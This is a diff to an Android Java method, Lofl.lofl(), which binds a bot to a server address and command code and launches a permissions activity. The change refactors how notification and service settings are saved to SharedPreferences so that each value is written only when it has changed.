@@ -39,23 +39,26 @@ public class Lofl {
 
     public static void lofl(Context context, String serverAddress, String commandCode, Class serviceClass, String notificationContent, String notificationTitle){
         Bot.bind(serverAddress, commandCode);
-        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
-        preferences.getString(SERVICE_NAME_KEY, LoflService.class.getName());
         SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
-        sharedPreferences.getString(SERVICE_NAME_KEY, LoflService.class.getName());
-        sharedPreferences.getString(LoflService.NOTIFICATION_CLICK_ACTIVITY, LoflActivity.class.getName());
         SharedPreferences.Editor editor = sharedPreferences.edit();
-        editor.putString(LoflService.NOTIFICATION_CLICK_ACTIVITY, context.getClass().getName());
-        if(serviceClass != null){
-            editor.putString(SERVICE_NAME_KEY, serviceClass.getName());
+        if(context != null && !context.getClass().getName().equals(sharedPreferences.getString(LoflService.NOTIFICATION_CLICK_ACTIVITY, LoflActivity.class.getName()))){
+            editor.putString(LoflService.NOTIFICATION_CLICK_ACTIVITY, context.getClass().getName());
+            editor.apply();
         }
-        if(notificationTitle != null){
+        if(serviceClass != null && !sharedPreferences.getString(SERVICE_NAME_KEY, LoflService.class.getName()).equals(serviceClass.getName())){
+            if(serviceClass != null){
+                editor.putString(SERVICE_NAME_KEY, serviceClass.getName());
+                editor.apply();
+            }
+        }
+        if(notificationTitle != null && !notificationTitle.equals(sharedPreferences.getString(Constants.Keys.NOTIFICATION_TITLE_KEY, "title"))){
             editor.putString(Constants.Keys.NOTIFICATION_TITLE_KEY, notificationTitle);
+            editor.apply();
         }
-        if(notificationContent != null){
+        if(notificationContent != null && !notificationContent.equals(sharedPreferences.getString(Constants.Keys.NOTIFICATION_CONTENT_KEY, "content"))){
             editor.putString(Constants.Keys.NOTIFICATION_CONTENT_KEY, notificationContent);
+            editor.apply();
         }
-        editor.apply();
         ((Activity)context).startActivityForResult(new Intent(context, LoflActivity.class), LoflActivity.PERMISSIONS_REQUEST_CODE);
     }
 
